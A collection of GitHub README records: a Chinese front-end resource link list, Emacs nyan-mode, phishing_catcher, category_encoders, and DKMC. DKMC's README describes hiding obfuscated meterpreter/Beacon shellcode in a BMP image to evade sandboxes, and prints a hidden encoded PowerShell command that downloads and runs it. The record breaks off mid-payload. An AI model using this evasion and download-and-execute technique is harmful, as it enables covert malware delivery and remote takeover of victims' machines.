Router\u5b98\u65b9\u6587\u6863\u4e2d\u6587\u7ffb\u8bd1\n\n\nReact\u5165\u95e8\u6559\u7a0b\nReact\u4ecb\u7ecd\u53ca\u5b9e\u8df5\u6559\u7a0b\n\n\nReact.js \u5b98\u65b9\u7f51\u5740\nReact.js \u5b98\u65b9\u6587\u6863\n\n\nReact.js material UI\nReact.js TouchstoneJS UI\n\n\nReact.js amazeui UI\nReact \u5165\u95e8\u5b9e\u4f8b\u6559\u7a0b - \u962e\u4e00\u5cf0\n\n\nReact Native \u4e2d\u6587\u7248\nWebpack \u548c React \u5c0f\u4e66 - gitbook\n\n\n\nVue\n\n\n\nVue\nAppDemo\nDemo\n\n\n\n\nNewsDemo\nvue\u8ba1\u7b97\u5c5e\u6027\nvue\u751f\u547d\u5468\u671f\n\n\nArticle\nVue\u6587\u6863\n\n\n\nVue-cli\u811a\u624b\u67b6\nVue\u7ec4\u4ef6\nvue\u81ea\u5b9a\u4e49\u6307\u4ee4\n\n\nVue\u8fc7\u6e21\u52a8\u753b\nVue\u6307\u4ee4\nVue api\u6587\u6863\n\n\nVue\u6267\u884cajax\u8bf7\u6c42\nvue\u5b9e\u73b0\u7c7b\u4f3cangular\u670d\u52a1\u7684\u65b9\u6cd5\nVue\u6e90\u7801\u53c2\u8003\u6587\u6863\n\n\nRouter\n\u8def\u7531\n\n\n\n\u8def\u7531demo\n\u8def\u7531demo2\n\n\n\nDirective\n\u6307\u4ee4\n\n\n\n\u6307\u4ee4demo\n\u81ea\u5b9a\u4e49\u6307\u4ee4demo\n\u6ed1\u52a8\u624b\u52bfdemo\n\n\nFilter\n\u8fc7\u6ee4\u5668\n\n\n\n\u8fc7\u6ee4\u5668demo\n\u8fc7\u6ee4\u5668\u5b9e\u73b0\u5206\u9875demo\n\u8fc7\u6ee4\u5668\u8bfb\u5199\u6570\u636e\n\n\nTransition\n\u8fc7\u6e21\n\n\n\n\u8fc7\u6e21demo\n\u8fc7\u6e21demo2\n\n\n\nForm\n\u8868\u5355\n\n\n\n\u83b7\u53d6\u8868\u5355\u503c\n\n\n\n\nComputed\n\u8ba1\u7b97\n\n\n\n\u8ba1\u7b97\u5c5e\u6027\n\n\n\n\nComponent\n\u7ec4\u4ef6\n\n\n\n\u7ec4\u4ef6demo\n\n\n\n\nReference\nReference\nReference\n\n\nVue\u5b98\u7f51\nVue\u8bba\u575b\nAwesome-vue\n\n\n\nNode\n\n\n\nNode\nArticle\n\n\n\n\nnode\u6280\u5de7\nNodeJs\u9759\u6001\u670d\u52a1\u5668\n\n\nReference\nReference\n\n\nNode.js \u5305\u6559\u4e0d\u5305\u4f1a\n\u4e03\u5929\u5b66\u4f1aNodeJS\n\n\n\u4ece\u96f6\u5f00\u59cbnodejs\u7cfb\u5217\u6587\u7ae0\nNode\u5165\u95e8\n\n\nNode\u521d\u5b66\u8005\u5165\u95e8\uff0c\u4e00\u672c\u5168\u9762\u7684NodeJS\u6559\u7a0b\n\n\n\n\nGulp\n\n\n\nGulp\nArticle\n\n\n\n\nGulp Demo\n\n\n\nGulp\nReference\n\n\nGulp\u5b98\u7f51\nGulp\u4e2d\u6587\u7f51\n\n\nGulp\u8d44\u6599\u6536\u96c6\nGulp\uff1a\u4efb\u52a1\u81ea\u52a8\u7ba1\u7406\u5de5\u5177 - ruanyifeng\n\n\nGulp\u63d2\u4ef6\nGulp\u4e0d\u5b8c\u5168\u5165\u95e8\u6559\u7a0b\n\n\nGulp \u5165\u95e8\u6307\u5357\n\n\n\n\n\u5176\u4ed6\n\n\n\nOther\nArticle\n\n\n\n\n\u5173\u4e8ePornographic website\u7684\u4e00\u4e9b\u524d\u7aef\u5206\u6790\n\u5fae\u4fe1\u516c\u4f17\u53f7\u5f00\u53d1\n\n\nAtom\u6280\u5de7\u603b\u7ed3\nMac\u5c0f\u6280\u5de7\n\n\nCSDN\u9875\u9762\u5185JS\u8df3\u8f6c\u811a\u672c\nCSDN\u535a\u5ba2\u9690\u85cf\u914d\u7f6e\n\n\n\u767e\u5ea6\u8bbe\u7f6e\u5c0f\u5ea6\u673a\u5668\u4eba\u51fa\u73b0\n\u524d\u7aef\u51b7\u77e5\u8bc6\uff0c\u5999\u7528\u6d4f\u89c8\u5668\u5730\u5740\u680f\n\n\nVim\u7b14\u8bb0\nCordova\u914d\u7f6e&&Ionic\u914d\u7f6e\uff08WebApp\u6df7\u5408\u5f00\u53d1\u73af\u5883\uff09\n\n\nIE8\u53ca\u4ee5\u4e0b\u6309\u94ae\u8d85\u94fe\u63a5\u65e0\u6cd5\u8df3\u8f6c\u7684\u95ee\u9898\n\n\n\n\n\u5206\u4eab\u529f\u80fd\n\n\n\nShare\nReference\n\n\n\n\n\u767e\u5ea6\u5206\u4eab(PC)\nJiaThis(PC)\n\n\n\u793e\u4f1a\u5316\u5206\u4eab\u7ec4\u4ef6(Mobile)\nShareSDK\u8f7b\u677e\u5b9e\u73b0\u793e\u4f1a\u5316\u529f\u80fd(Mobile)\n\n\n\u53cb\u76df\u5206\u4eab(Mobile)\n\n\n\n\n\u5728\u7ebf\u6f14\u793a\n\n\n\nReference\nReference\n\n\n\n\njs \u5728\u7ebf\u7f16\u8f91 - runjs\njs \u5728\u7ebf\u7f16\u8f91 - jsbin\n\n\njs \u5728\u7ebf\u7f16\u8f91 - codepen\njs \u5728\u7ebf\u7f16\u8f91 - jsfiddle\n\n\njava \u5728\u7ebf\u7f16\u8f91 - runjs\njs \u5728\u7ebf\u7f16\u8f91 - hcharts\n\n\njs \u5728\u7ebf\u7f16\u8f91 - jsdm\nsql \u5728\u7ebf\u7f16\u8f91 - sqlfiddle\n\n\nmozilla \u5728\u7ebf\u7f16\u8f91\u5668\n\n\n\n\n\u5bcc\u6587\u672c\u7f16\u8f91\u5668\n\n\n\nReference\nReference\n\n\n\n\n\u767e\u5ea6ueditor\nckeditor\n\n\ntinymce\nkindeditor\n\n\nwysiwyg\nBachEditor\n\n\nsimditor\nsummernote\n\n\nSquire\nwangEditor\n\n\n\nChrome\n\n\n\nReference\nReference\n\n\n\n\nChrome - \u57fa\u7840\nChrome - \u8fdb\u9636\n\n\nChrome - \u6027\u80fd\nChrome - \u6027\u80fd\u8fdb\u9636\n\n\nChrome - \u79fb\u52a8\nChrome - \u4f7f\u7528\u6280\u5de7\n\n\nChrome - Console\u63a7\u5236\u53f0\u4e0d\u5b8c\u5168\u6307\u5357\nchrome\u5f00\u53d1\u5de5\u5177\u5feb\u6377\u952e\n\n\nChrome \u5f00\u53d1\u5de5\u5177 Workspace \u4f7f\u7528\nChrome\u795e\u5668Vimium\u5feb\u6377\u952e\u5b66\u4e60\u8bb0\u5f55\n\n\nSass\u8c03\u8bd5-w3cplus\n\u5982\u4f55\u66f4\u4e13\u4e1a\u7684\u4f7f\u7528Chrome\u5f00\u53d1\u8005\u5de5\u5177-w3cplus\n\n\nChrome\u8c03\u8bd5canvas\n\u795e\u5668\u2014\u2014Chrome\u5f00\u53d1\u8005\u5de5\u5177(\u4e00)\n\n\n\u5947\u8da3\u767e\u79d1\u6027\u80fd\u4f18\u5316(Chrome DevTools \u4e2d\u7684 Timeline Profils \u7b49\u5de5\u5177\u4f7f\u7528\u4ecb\u7ecd\nChrome \u5f00\u53d1\u8005\u5de5\u5177\u7684 15 \u4e2a\u5c0f\u6280\u5de7\n\n\nChrome\u5f00\u53d1\u8005\u5de5\u5177\u4e0d\u5b8c\u5168\u6307\u5357\nChrome \u5f00\u53d1\u8005\u5de5\u5177\u4f7f\u7528\u6280\u5de7\n\n\n\n\u6027\u80fd\u4f18\u5316\n\n\n\nReference\nReference\n\n\n\n\nJavascript\u9ad8\u6027\u80fd\u52a8\u753b\u4e0e\u9875\u9762\u6e32\u67d3\n\u79fb\u52a8H5\u524d\u7aef\u6027\u80fd\u4f18\u5316\u6307\u5357\n\n\n\u7ed9\u7f51\u9875\u8bbe\u8ba1\u5e08\u548c\u524d\u7aef\u5f00\u53d1\u8005\u770b\u7684\u524d\u7aef\u6027\u80fd\u4f18\u5316\n\u5f20\u946b\u65ed\u2014\u2014\u524d\u7aef\u6027\u80fd\n\n\nweb\u524d\u7aef\u6027\u80fd\u4f18\u5316\u8fdb\u9636\u8def\nHey\u2014\u2014\u524d\u7aef\u6027\u80fd\n\n\nYSLOW\u4e2d\u6587\u4ecb\u7ecd\nYahoo!\u56e2\u961f\u5b9e\u8df5\u5206\u4eab\uff1a\u7f51\u7ad9\u6027\u80fd\n\n\n\u52a0\u8f7d\uff0c\u4e0d\u53ea\u662f\u5c11\u4e00\u70b9\u70b9\n\u753112306\u8c08\u8c08\u7f51\u7ad9\u524d\u7aef\u6027\u80fd\u548c\u540e\u7aef\u6027\u80fd\u4f18\u5316\n\n\n\u3010\u9ad8\u6027\u80fd\u524d\u7aef1\u3011\u9ad8\u6027\u80fdHTML\n\u3010\u9ad8\u6027\u80fd\u524d\u7aef2\u3011\u9ad8\u6027\u80fdCSS\n\n\n\u524d\u7aef\u5de5\u7a0b\u4e0e\u6027\u80fd\u4f18\u5316\uff08\u4e0a\uff09\uff1a\u9759\u6001\u8d44\u6e90\u7248\u672c\u66f4\u65b0\u4e0e\u7f13\u5b58\n\u524d\u7aef\u5de5\u7a0b\u4e0e\u6027\u80fd\u4f18\u5316\uff08\u4e0b\uff09\uff1a\u9759\u6001\u8d44\u6e90\u7ba1\u7406\u4e0e\u6a21\u677f\u6846\u67b6\n\n\nHTTPS\u8fde\u63a5\u7684\u524d\u51e0\u6beb\u79d2\u53d1\u751f\u4e86\u4ec0\u4e48\nYslow\n\n\n\u963f\u91cc\u65e0\u7ebf\u524d\u7aef\u6027\u80fd\u4f18\u5316\u6307\u5357(Pt.1 \u52a0\u8f7d\u671f\u4f18\u5316)\n\u6beb\u79d2\u5fc5\u4e89\uff0c\u524d\u7aef\u7f51\u9875\u6027\u80fd\u6700\u4f73\u5b9e\u8df5\n\n\n\nCDN\n\n\n\nReference\nReference\n\n\n\n\nJquery&Bootstrap\u4e2d\u6587\u7f51\u5f00\u6e90\u9879\u76ee\u514d\u8d39 CDN \u670d\u52a1\nBootstrap\u4e2d\u6587\u7f51\u5f00\u6e90\u9879\u76ee\u514d\u8d39 CDN \u670d\u52a1\n\n\n\u65b0\u6d6aCDN\n\u767e\u5ea6\u9759\u6001\u8d44\u6e90\u516c\u5171\u5e93\n\n\n\u5f00\u653e\u9759\u6001\u6587\u4ef6 CDN - \u4e03\u725b\nCDN\u52a0\u901f - jq22\n\n\n\u5fae\u8f6fCDN\nAngular CDN\n\n\n360\u7f51\u7ad9\u536b\u58eb\u5e38\u7528\u524d\u7aef\u516c\u5171\u5e93CDN\u670d\u52a1\n\n\n\n\nGit\n\n\n\nArticle\nArticle\n\n\n\n\nGit\u64cd\u4f5c\nGit CSDN Blog\n\n\nReference\nReference\n\n\nGit-scm\nGit-for-windows\n\n\n\u5ed6\u96ea\u5cf0-Git\u6559\u7a0b\nGogithub\n\n\nGit\u5e38\u89c4\u547d\u4ee4\u7ec3\u4e60\nGit\u7684\u8d44\u6599\u6574\u7406\n\n\n\u6211\u6240\u8bb0\u5f55\u7684git\u547d\u4ee4\uff08\u975e\u5e38\u5b9e\u7528\uff09\nGitHub \u6f2b\u6e38\u6307\u5357\n\n\nGitHub\u79d8\u7c4d\n\u52a8\u753b\u65b9\u5f0f\u7ec3\u4e60git\n\n\n\nSass&Less\n\n\n\nArticle\nArticle\n\n\n\n\nLess\u6559\u7a0b\n\n\n\nReference\nReference\n\n\nSass\nSass\u4e2d\u6587\u6587\u6863\n\n\nLess\n\n\n\n\nMarkdown\n\n\n\nReference\nReference\n\n\n\n\nMarkdown \u8bed\u6cd5\u8bf4\u660e (\u7b80\u4f53\u4e2d\u6587\u7248)\nMarkdown\u5165\u95e8\u53c2\u8003\n\n\nMdeditor(\u4e00\u6b3e\u56fd\u5185\u7684\u5728\u7ebfmarkdown\u7f16\u8f91\u5668)\nStackedit(\u56fd\u5916\u7684\u5728\u7ebfmarkdown\u7f16\u8f91\u5668\uff0c\u529f\u80fd\u5f3a\u5927\uff0c\u540c\u6b65\u4e91\u76d8)\n\n\nMditor\u4e00\u6b3e\u8f7b\u91cf\u7ea7\u7684markdown\u7f16\u8f91\u5668\nlepture-editor\n\n\nMarkdown-editor\n\n\n\n\n\u524d\u7aef\u6587\u6863\n\n\n\nReference\nReference\n\n\n\n\n\u524d\u7aef\u77e5\u8bc6\u7ed3\u6784\nWeb\u524d\u7aef\u5f00\u53d1\u5927\u7cfb\u6982\u89c8\n\n\n\u514d\u8d39\u7684\u7f16\u7a0b\u4e2d\u6587\u4e66\u7c4d\u7d22\n\u524d\u7aef\u4e66\u7c4d\n\n\n\u524d\u7aef\u514d\u8d39\u4e66\u7c4d\u5927\u5168\n\u91cd\u65b0\u4ecb\u7ecdJavaScript\uff08JS\u6559\u7a0b\uff09\n\n\n[Gitbook](https://www.gitbook.com \u56fd\u5916\u7684\u5728\u7ebfmarkdown\u53ef\u7f16\u8f91\u6210\u4e66)\nFront-End-Develop-Guide \u524d\u7aef\u5f00\u53d1\u6307\u5357\n\n\n\u524d\u7aef\u5f00\u53d1\u7b14\u8bb0\u672c\n\u5927\u524d\u7aef\u5de5\u5177\u96c6\n\n\n\u524d\u7aef\u5f00\u53d1\u8005\u624b\u518c\n\u7ed3\u5408\u4e2a\u4eba\u7ecf\u5386\u603b\u7ed3\u7684\u524d\u7aef\u5165\u95e8\u65b9\u6cd5\n\n\n2016\u6700\u65b0\u524d\u7aef\u5b66\u4e60\u8ba1\u5212\n\n\n\n\n\u524d\u7aef\u89c4\u8303\n\n\n\nReference\nReference\n\n\n\n\n\u901a\u8fc7\u5206\u6790github\u4ee3\u7801\u5e93\u603b\u7ed3\u51fa\u6765\u7684\u5de5\u7a0b\u5e08\u4ee3\u7801\u4e66\u5199\u4e60\u60ef\nHTML&CSS\u7f16\u7801\u89c4\u8303 by @mdo\n\n\n\u524d\u7aef\u7f16\u7801\u89c4\u8303\u4e4bjs - by yuwenhui\n\u524d\u7aef\u7f16\u7801\u89c4\u8303\u4e4bjs - by \u674e\u9756\n\n\nAirbnb JavaScript \u7f16\u7801\u89c4\u8303\uff08\u7b80\u4f53\u4e2d\u6587\u7248\uff09\nAMD\u4e0eCMD\u89c4\u8303\u7684\u533a\u522b\n\n\nAMD\u4e0eCMD\u89c4\u8303\u7684\u533a\u522b\nKISSY \u6e90\u7801\u89c4\u8303\n\n\n\u524d\u7aef\u4ee3\u7801\u89c4\u8303\u53ca\u6700\u4f73\u5b9e\u8df5\n\u767e\u5ea6\u524d\u7aef\u89c4\u8303\n\n\nJavaScript\u98ce\u683c\u6307\u5357/\u7f16\u7801\u89c4\u8303\uff08Airbnb\u516c\u53f8\u7248\uff09\n\u7f51\u6613\u524d\u7aef\u5f00\u53d1\u89c4\u8303\n\n\n\u524d\u7aef\u89c4\u8303\u8d44\u6e90\u5217\u8868\nWeb \u524d\u7aef\u5f00\u53d1\u89c4\u8303\u6587\u6863\n\n\n\n\u524d\u7aef\u9762\u8bd5\n\n\n\nReference\nReference\n\n\n\n\n2016\u6821\u62db\u5185\u63a8 -- \u963f\u91cc\u5df4\u5df4\u524d\u7aef -- \u56db\u9762\u9762\u8bd5\u7ecf\u5386\n\u90a3\u51e0\u4e2a\u6708\u5728\u627e\u5de5\u4f5c\uff08\u767e\u5ea6\uff0c\u7f51\u6613\u6e38\u620f\uff0c\u534e\u4e3a\uff09\n\n\n\u524d\u7aef\u5f00\u53d1\u9762\u8bd5\u9898\nFront-end-Interview-questions\n\n\n5\u4e2a\u7ecf\u5178\u7684\u524d\u7aef\u9762\u8bd5\u95ee\u9898\nFront-end-Developer-Interview-Questions\n\n\nBAT\u53ca\u5404\u5927\u4e92\u8054\u7f51\u516c\u53f82014\u524d\u7aef\u7b14\u8bd5\u9762\u8bd5\u9898\uff1aJavaScript\u7bc7\n\u524d\u7aef\u5f00\u53d1\u9762\u8bd5\u9898\u5927\u6536\u96c6\n\n\n\u6536\u96c6\u7684\u524d\u7aef\u9762\u8bd5\u9898\u548c\u7b54\u6848\n\u524d\u7aef\u5f00\u53d1\u9762\u8bd5\u9898\n\n\n\u524d\u7aef\u9762\u8bd5\u5927\u5168\n\u5173\u4e8e\u524d\u7aef\u9762\u8bd5\n\n\n\n\u524d\u7aef\u7f51\u7ad9\n\n\n\nReference\nReference\n\n\n\n\n\u6398\u91d1\n\u767e\u5ea6FEX\n\n\n\u963f\u91ccUED\n\u83dc\u9e1f\u6559\u7a0b\n\n\nQDFuns\n\u5e55\u8bfe\u7f51\n\n\nCodepen\nSentsin\n\n\nCTOLib\nCTOLib/Node\n\n\n\nJS\u7ec3\u4e60\n\n\n\nReference\nReference\n\n\n\n\nCodewars\nJavascript-puzzlers\n\n\nFreecodecamp\u4e2d\u6587\u7248\nES6katas\n\n\nNow Coder\u725b\u5ba2\u7f51\nLeetcode\n\n\nNodeschool\nHackerrank\n\n\n\n\u7b97\u6cd5\n\n\n\nReference\nReference\n\n\n\n\n\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5 JavaScript \u63cf\u8ff0. \u7ae0\u8282\u7ec3\u4e60\n\u5e38\u89c1\u6392\u5e8f\u7b97\u6cd5\uff08JS\u7248\uff09\n\n\n\u7ecf\u5178\u6392\u5e8f\n\u5e38\u89c1\u6392\u5e8f\u7b97\u6cd5-js\u7248\u672c\n\n\n\nES\n\n\n\nReference\nReference\n\n\n\n\nExploring-ES6\u7ffb\u8bd1\n\u962e\u4e00\u5cf0 ES6\n\n\nECMA-262\uff0c\u7b2c 5 \u7248\nES5"}, {"title": "TeMPOraL/nyan-mode", "language": "Emacs Lisp", "content": "Nyan Mode - Turn your Emacs into Nyanmacs! :)\n\n\n\n\n\nWARNING, MIND DUMBING CONTENT INSIDE.\n\n\u201cNyan-mode. It\u2019s things like this that make me proud to be an emacs user.\u201d - mitchellh\n\n\n\u201cEverything that\u2019s wrong (or right) with Emacs.\u201d - wasamasa\n\nNyanmacs is expanding!! Read the story so far! :).\n\nNyan Mode is an analog indicator of your position in the buffer. The\n  Cat should go from left to right in your mode-line, as you move your\n  point from 0% to 100%.\nFeatures\n\nNEW! You can scroll the buffer by clicking in the Nyan Cat area!\nNEW! You can customize the minimum window width below which Nyan Mode will be disabled.\nMind dumbing content included,\nAnimation (M-x nyan-start-animation, M-x nyan-stop-animation),\nWavy rainbow (M-x nyan-toggle-wavy-trail),\nMusic, mplayer is needed (M-x nyan-start-music, M-x nyan-stop-music) (thanks, George Leontiev!),\nCustomizable properties.\n\nCustomizations\n\nnyan-animate-nyancat - t to have it animated, nil for a static version.\nnyan-animation-frame-interval - number of seconds between animation frames. Accepts fractional values.\nnyan-bar-length - length of nyan-mode bar, in 8px-wide units.\nnyan-cat-face-number - choose a cat face for the console mode.\nnyan-wavy-trail - t to make the trail wavy; works even better when animation is enabled!\nnyan-minimum-window-width - minimum width of the window, below\n    which Nyan Mode will be disabled. This is important because Nyan\n    Mode will otherwise push out more relevant information from the\n    modelilne.\n\nUsing Nyan Mode with custom modeline\nFor those who were asking, or are planning to, Amit Patel shared\n  some tips on how to make nyan-mode work with custom modeline.\nHe changed his mode-line-format to appear like the following:\n(setq mode-line-format\n      (list\n       '(:eval (list (nyan-create)))\n       ))\nKnown issues\nIt\u2019s my second attempt to write a minor mode in Emacs, so there will\n  definiely be some bugs.\nThis version uses XPM images, which should be supported by default by\n  most Emacs 23 installations, Windows included. In case it doesn\u2019t\n  work, try switching to master-png branch. This branch, however, may\n  have it\u2019s own issues:\nThere was a problem with displaying PNG images, which require libpng\n  to be available for Emacs. The lib is sometimes missing (e.g. some\n  Windows installation). To make it work on Windows, one needs to\n  download a proper DLL and put it into emacs bin/ folder. To see which\n  DLL is needed, do: M-x describe-variable <ret> image-library-alist <ret>.\nCustomizing nyan-animate-nyancat is broken; don\u2019t do it.\n  I think it works now; please report issues if there are problems with it.\nCredits\nThanks to everyone contributing patches, bug repots and ideas! The Emacs world is forever in your debt!\nCode and idea inspired by sml-modeline.el, written by Lennart Borgman.\n  See: http://bazaar.launchpad.net/~nxhtml/nxhtml/main/annotate/head%3A/util/sml-modeline.el\nFor animated Nyan Cat, I used frames by DryBowser455.\nOther editors\nFor many years only the One True Editor was blessed with the presence\n  of the Nyan Cat. Since its inception, however, daring souls have brought\n  Nyanness to the lands of Lesser Editors.\nHere are the examples I\u2019ve tracked down so far:\n\nVim - nefo-mi\u2019s nyan-modoki.vim (text-only, it seems)\nVim - edvb54\u2019s catium.vim (also text, apparently)\nSublime Text - wiggin15\u2019s SublimeNyan\nAtom - dz\u2019s atom-nyancat\nqutebrowser - qutenyan\n\nIf you\u2019ve seen others in the wild, please submit.\nRelated\nCheck out Aaron Miller\u2019s weatherline.el, partially inspired by Nyan Mode.\nAlso check out zone-nyan by Vasilij Schneidermann if you want the Nyan\n  Cat to visit your Emacs when you step away from the keyboard!\nNyanyanyanyanyanyanya! \u266c \u266b \u266a \u2669"}, {"title": "x0rz/phishing_catcher", "language": "Python", "content": "Phishing catcher\nCatching malicious phishing domain names using certstream SSL certificates live stream.\nThis is just a working PoC, feel free to contribute and tweak the code to fit your needs \ud83d\udc4d\n\nInstallation\nThe script should work fine using Python2 or Python3.\nYou will need the following python packages installed: certstream, tqdm, entropy, termcolor, tld, python_Levenshtein\npip install -r requirements.txt\nUsage\n$ ./catch_phishing.py\n\nExample phishing caught\n\nLicense\nGNU GPLv3\nIf this tool has been useful for you, feel free to thank me by buying me a coffee"}, {"title": "scikit-learn-contrib/categorical-encoding", "language": "Python", "content": "Categorical Encoding Methods\n\n\n\n\nA set of scikit-learn-style transformers for encoding categorical\nvariables into numeric by means of different techniques.\nImportant Links\nDocumentation: http://contrib.scikit-learn.org/categorical-encoding/\nEncoding Methods\n\nBackward Difference Contrast [2][3]\nBaseN [6]\nBinary [5]\nHashing [1]\nHelmert Contrast [2][3]\nJames-Stein Estimator [9]\nLeaveOneOut [4]\nM-estimator [7]\nOrdinal [2][3]\nOne-Hot [2][3]\nPolynomial Contrast [2][3]\nSum Contrast [2][3]\nTarget Encoding [7]\nWeight of Evidence [8]\n\nInstallation\nThe package requires: numpy, statsmodels, and scipy.\nTo install the package, execute:\n$ python setup.py install\nor\npip install category_encoders\nor\nconda install -c conda-forge category_encoders\nTo install the development version, you may use:\npip install --upgrade git+https://github.com/scikit-learn-contrib/categorical-encoding\nUsage\nAll of the encoders are fully compatible sklearn transformers, so they can be used in pipelines or in your existing scripts. Supported input formats include numpy arrays and pandas dataframes. If the cols parameter isn't passed, all columns with object or pandas categorical data type will be encoded. Please see the docs for transformer-specific configuration options.\nExamples\nThere are two types of encoders: unsupervised and supervised. An unsupervised example:\nfrom category_encoders import *\nimport pandas as pd\nfrom sklearn.datasets import load_boston\n\n# prepare some data\nbunch = load_boston()\ny = bunch.target\nX = pd.DataFrame(bunch.data, columns=bunch.feature_names)\n\n# use binary encoding to encode two categorical features\nenc = BinaryEncoder(cols=['CHAS', 'RAD']).fit(X)\n\n# transform the dataset\nnumeric_dataset = enc.transform(X)\nAnd a supervised example:\nfrom category_encoders import *\nimport pandas as pd\nfrom sklearn.datasets import load_boston\n\n# prepare some data\nbunch = load_boston()\ny_train = bunch.target[0:250]\ny_test = bunch.target[250:506]\nX_train = pd.DataFrame(bunch.data[0:250], columns=bunch.feature_names)\nX_test = pd.DataFrame(bunch.data[250:506], columns=bunch.feature_names)\n\n# use target encoding to encode two categorical features\nenc = TargetEncoder(cols=['CHAS', 'RAD']).fit(X_train, y_train)\n\n# transform the datasets\ntraining_numeric_dataset = enc.transform(X_train, y_train)\ntesting_numeric_dataset = enc.transform(X_test)\nAdditional examples and benchmarks can be found in the examples directory.\nContributing\nCategory encoders is under active development, if you'd like to be involved, we'd love to have you. Check out the CONTRIBUTING.md file\nor open an issue on the github project to get started.\nReferences:\n\nKilian Weinberger; Anirban Dasgupta; John Langford; Alex Smola; Josh Attenberg (2009). Feature Hashing for Large Scale Multitask Learning. Proc. ICML.\nContrast Coding Systems for categorical variables.  UCLA: Statistical Consulting Group. From https://stats.idre.ucla.edu/r/library/r-library-contrast-coding-systems-for-categorical-variables/.\nGregory Carey (2003). Coding Categorical Variables. From http://psych.colorado.edu/~carey/Courses/PSYC5741/handouts/Coding%20Categorical%20Variables%202006-03-03.pdf\nStrategies to encode categorical variables with many categories. From https://www.kaggle.com/c/caterpillar-tube-pricing/discussion/15748#143154.\nBeyond One-Hot: an exploration of categorical variables. From http://www.willmcginnis.com/2015/11/29/beyond-one-hot-an-exploration-of-categorical-variables/\nBaseN Encoding and Grid Search in categorical variables. From http://www.willmcginnis.com/2016/12/18/basen-encoding-grid-search-category_encoders/\nDaniele Miccii-Barreca (2001). A Preprocessing Scheme for High-Cardinality Categorical Attributes in Classification and Prediction Problems. SIGKDD Explor. Newsl. 3, 1. From http://dx.doi.org/10.1145/507533.507538\nWeight of Evidence (WOE) and Information Value Explained. From https://www.listendata.com/2015/03/weight-of-evidence-woe-and-information.html\nEmpirical Bayes for multiple sample sizes. From http://chris-said.io/2017/05/03/empirical-bayes-for-multiple-sample-sizes/"}, {"title": "Mr-Un1k0d3r/DKMC", "language": "Python", "content": "Don't Kill My Cat (DKMC)\nDon't kill my cat is a tool that generates obfuscated shellcode that is stored inside of polyglot images. The image is 100% valid and also 100% valid shellcode. The idea is to avoid sandbox analysis since it's a simple \"legit\" image. For now the tool rely on PowerShell the execute the final shellcode payload.\nWhy it's called don't kill my cat? Since I suck at finding names for tools, I decided to rely on the fact that the default BMP image is a cat to name the tool.\nPresentation on how it works internally can be found here: https://github.com/Mr-Un1k0d3r/DKMC/blob/master/DKMC%20presentation%202017.pdf\nBasic Flow\n\nGenerate shellcode (meterpreter / Beacon)\nEmbed the obfuscated shellcode inside the image\nPowerShell download the image and execute the image as shellcode\nGet your shell\n\nInstallation\n$ git clone https://github.com/Mr-Un1k0d3r/DKMC \n$ cd DKMC\n$ mkdir output\n\nUsage\nLaunching DKMC\n$ python dkmc.py\n\n\nDKMC - Don't kill my cat\n         Evasion tool - Mr.Un1k0d3r RingZer0 Team\n     |\\      _,,,---,,_\n    /,`.-'`'    -.  ;-;;,_\n   |,4-  ) )-,_..;\\ (  `'-'\n  '---''(_/--'  `-'\\_)    The sleepy cat\n\n----------------------------------------------------\nSelect an option:\n\n        [*] (gen)       Generate a malicious BMP image\n        [*] (web)       Start a web server and deliver malicious image\n        [*] (ps)        Generate Powershell payload\n        [*] (sc)        Generate shellcode from raw file\n        [*] (exit)      Quit the application\n\n>>>\n\nGenerate shellcode from a raw file\n>>> sc\n(shellcode)>>> set source shellcode.txt\n        [+] source value is set.\n\n(shellcode)>>> run\n        [+] Shellcode:\n\\x41\\x41\\x41\\x41\n\nGenerate the obfuscated shellcode embedded inside of an image.\n>>> gen\n(generate)>>> set shellcode \\x41\\x41\\x41\\x41\n        [+] shellcode value is set.\n        \n(generate)>>> run\n        [+] Image size is 300 x 275\n        [+] Generating obfuscation key 0x1f1dad93\n        [+] Shellcode size 0x4 (4) bytes\n        [+] Generating magic bytes 0xa4d0c752\n        [+] Final shellcode length is 0x57 (87) bytes\n        [+] New BMP header set to 0x424de9a4c60300\n        [+] New height is 0x0e010000 (270)\n        [+] Successfully save the image. (/home/ringzer0/tools/DKMC/output/output-1496175261.bmp)\n\n(generate)>>>\n\nGenerate PowerShell payload to execute on the victim system.\n>>> ps\n(powershell)>>> set url http://127.0.0.1:8080/output-1496175261.bmp\n        [+] url value is set.\n\n(powershell)>>> run\n        [+] Powershell script:\npowershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBDAEYAVABUAEwAVgBrAEMALwB6AEUAMABPAFQAWQB4AE4AegBVADAATgBEAFEAdQBNAGoAVQAhAHQAVgBaAHIAYgA5AHAASQBGAFAAMABlAEsAZgA5AGgAVgBDAEgAWgBsAG8AdwBMAFMAYgBmAE4AUgBxAHAAVQBuAG4AbQAwAEUASQBKAEoAMABvAFMAaQBhAHIAIQB2AE0ARwBIAHMATQBUAE4AagBFAHIAZgBOAGYAOQA5AHIAWQB6AGQARQBrAEcAeAAyAHQAVwBzACsAWQBIAHYAdQAzAEwAbAB6AHoAcgBuAEgANAA0AEkAdQB1ADEAbwB5AFQAMwBlAEUARAA2AFIAOABDAFYASQB4AEUAWgBLADkAMwBaADMAZABuAFoASwAvAGIASAA4AEYANQBRAHMALwBjAFAAWABGAFAASQBDADcAZQBmACsAbwBkADAANAArAGsAawAvAEcANwBzADQAawBEAGoAMgBkAHgAbAA3ADIANQB2AGYAWAB2AFQAYgA1AHUAYgB0AEQAOABxAHQASABKAFEAMgBJAFcAVgBwAFMAKwBUADAAUQBmAHMAegBCAEoAdABsAEQASgBJAFUASABmAGkAegBCAGUAZwB3AHUATABTADQARwA3AGMAKwBZADEAUgB6AFcAbwBxAGcAcAAhAHMAcgBDADAAZQBGAGgASQA1AFkAUwBRAHIAMQA2AGQAbwA1ACEAMQA1AFMAQwBZAE0AdwBaAEsATgBNAGkAdgA4AGoAVgBEAEMAUwBVAHoAOABhADMANABHAG4AeQBrADUAUwArAE8AMABkAGMAagBDAG4AUAB3ADUASQBHADkAVwBhADQAbwAxAHIAbwBwADIATgBmAGgARQBmAFQAYQBoADAAMwA0AGsAeQBiAHgAcgBkAHYAaABqAFUAcwBWADAAZABPAGEAeABGAFQAcgBrAHoARABUAFoAUwBHAHcAUABFADUATgB5AHoAeQBZAEsAVQBMAEQAcABJAEkAVAB